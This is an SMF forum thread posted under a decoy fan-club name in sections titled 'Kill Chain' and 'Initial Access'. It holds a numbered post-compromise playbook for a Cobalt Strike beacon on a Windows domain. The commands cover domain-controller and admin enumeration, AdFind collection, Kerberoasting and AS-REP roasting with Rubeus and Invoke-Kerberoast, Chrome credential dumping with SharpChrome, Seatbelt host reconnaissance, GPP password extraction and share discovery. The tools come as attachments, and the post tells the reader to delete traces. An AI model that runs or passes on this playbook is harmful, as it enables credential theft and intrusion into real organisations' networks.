@@ -1,0 +1,117 @@
+    Vampir
+    New Topics
+    New replies
+
+    Start
+    Help
+    Search
+    Profile
+    Private Messages
+    Members
+
+Monica Bellucci Fan Club
+
+    Monica Bellucci Fan Club "
+    Kill Chain "
+    Initial Access "
+    Fast-Guide
+
+Fast-Guide
+Alter - 2 - 67
+" previous topic next topic "
+
+Pages: 1
+Alter
+
+    Administrator
+    Member
+    *****
+        28
+        View Profile Private Message (Offline)
+
+: February 11, 2021, 02:27:10 am
+Written by
+
+In the input we have an ordinary bot with user rights and consider the first stage of work from this context.
+
+1. Gathering information about domain controllers on the network
+   - net domain_controllers
+   - net dclist
+   - shell nltest /dclist:
+The first of the three commands is usually enough, but if it gives no result, you can try the others.
+
+2. Gathering information about Active Directory composition using AdFind.exe
+   - Load adfind.exe and adf.bat into a writable folder
+   - move cobalt bin to the folder
+   - run shell adf.bat
+   - wait for script to finish
+   - download the result and delete what you downloaded to your machine
+
+3. Performing a kerberoast attack
+   - execute-assembly /home/omar/Desktop/Fast-Guide/Rubeus.exe kerberoast /ldapfilter:'admincount=1' /format:hashcat /outfile:C:\ProgramData\hashes.txt
+   - execute-assembly /home/omar/Desktop/Fast-Guide/Rubeus.exe asreproast /format:hashcat /outfile:C:\ProgramData\asrephashes.txt
+   - download these files (if they give us results)
+   - If they didn't give us results then we will use alternative powershell script to perform the attack
+   - powershell-import /home/omar/Desktop/Fast-Guide/Invoke-Kerberoast.ps1
+   - psinject 4728 x86 Invoke-Kerberoast -OutputFormat HashCat | fl | Out-File -FilePath c:\ProgramData\pshashes.txt -append -force -encoding UTF8
+      4728 in this case is the current pid and x86 is its bit size
+   (obtained hashes will be sent to brute force to get cleartext passwords or will be used in the context of SYSTEM rights)
+
+4. Collect information from the Chrome browser to search for possible local cleatextential credentials
+   - Execute-assembly /home/omar/Desktop/Fast-Guide/SharpChrome.exe logins /showall
+   (here we get the password set of the current user and some idea of what network and external resources this user uses)
+
+5. Request information about domain administrators and local administrators
+   - shell net group "domain admins" /dom
+   - shell net localgroup administrators
+
+6. Collecting information on the current machine using SeatBelt
+   - execute-assembly /home/omar/Desktop/Fast-Guide/Seatbelt.exe -group=all -outputfile="C:\ProgramData\seatinfo.txt"
+   (no explanations here, the number of checks there is decent and all information gathered is to some extent important both on the local machine and on the network)
+   
+7. Checking for saved passwords in domain group policy files
+   - execute-assembly /home/omar/Desktop/Fast-Guide/Net-GPPassword.exe
+   
+8. Collect the available shares and see if any $ADMIN shares are available for our current user in the domain
+   - powershell-import /home/omar/Desktop/Fast-Guide/ShareFinder.ps1
+   - psinject 4728 x86 Invoke-ShareFinder -CheckShareAccess -Verbose | Out-File -Encoding ascii C:\ProgramData\found_shares.txt
+   (at this moment the scan is started and the result is written into a file, the file will be full size when the scan is finished and you can download it)
+
+All utility output files are placed in a folder with the name of the case, the output of the beacon is written in a separate file creds.txt, which will lie in this folder.
+* adf.bat (0.34 KB - downloaded 2 times).
+* ShareFinder.ps1 (44.41 KB - downloaded 1 time).
+* AdFind.exe (1361.5 KB - downloaded 3 times).
+* Invoke-Kerberoast.ps1 (45.75 KB - downloaded 2 times).
+
+Alter
+
+    Administrator
+    Member
+    *****
+        28
+        View Profile Private Message (Offline)
+
+Response #1 : February 11, 2021, 02:28:16 am
+Written by
+
+I recommend to use all c# utilities attached in this thread, building them from sources on githab.
+* Net-GPPPassword.exe (9 KB - downloaded 1 time).
+* Rubeus.exe (223 KB - downloaded 4 times).
+* Seatbelt.exe (534 KB - downloaded 1 time)
+* SharpChrome.exe (805.5 KB - downloaded 1 time)
+
+Pages: 1
+
+    Monica Bellucci Fan Club "
+    Kill Chain "
+    Initial Access "
+    Fast-Guide
+
+Go to:
+ 
++ Quick Reply
+
+    SMF 2.0.18 | SMF © 2020, Simple Machines
+    Developed with SychO
+
+
